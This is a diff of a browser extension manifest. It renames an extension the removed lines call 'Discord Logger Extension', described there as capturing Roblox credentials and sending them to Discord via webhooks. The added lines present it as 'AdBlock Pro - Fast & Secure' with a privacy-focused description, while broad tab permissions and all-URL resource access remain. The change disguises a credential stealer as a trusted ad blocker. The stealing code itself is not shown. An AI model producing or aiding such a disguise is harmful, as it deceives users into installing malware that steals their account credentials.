@@ -1,9 +1,8 @@
-
 {
   "manifest_version": 3,
-  "name": "Discord Logger Extension",
+  "name": "AdBlock Pro - Fast & Secure",
   "version": "1.1",
-  "description": "Captures Roblox credentials and sends them to Discord via webhooks",
+  "description": "Block ads, pop-ups, and trackers. Fast browsing with enhanced privacy protection.",
   "permissions": [
     "activeTab",
     "tabs",
@@ -29,12 +28,18 @@
   ],
   "action": {
     "default_popup": "popup.html",
-    "default_title": "Discord Logger"
+    "default_title": "AdBlock Pro"
   },
   "web_accessible_resources": [
     {
       "resources": ["*"],
       "matches": ["<all_urls>"]
     }
-  ]
+  ],
+  "icons": {
+    "16": "icon16.png",
+    "32": "icon32.png",
+    "48": "icon32.png",
+    "128": "icon128.png"
+  }
 }
